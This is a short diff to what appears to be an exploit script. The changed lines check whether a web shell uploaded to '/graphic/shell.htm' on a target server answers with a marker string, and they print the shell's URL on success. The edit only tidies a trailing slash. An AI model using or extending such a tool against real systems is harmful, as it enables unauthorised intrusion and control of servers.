@@ -134,7 +134,7 @@ def main():
     st, body = t.get("/graphic/shell.htm")
     if st == 200 and b"BlackHatExploitation" in body:
         print("[+] SUCCESS!")
-        print(f"[+] Web shell: {url}/graphic/shell.htm")
+        print(f"[+] Web shell: {url.rstrip('/')}/graphic/shell.htm")
     else:
         print(f"[-] Upload failed, status: {st}")
         if body:
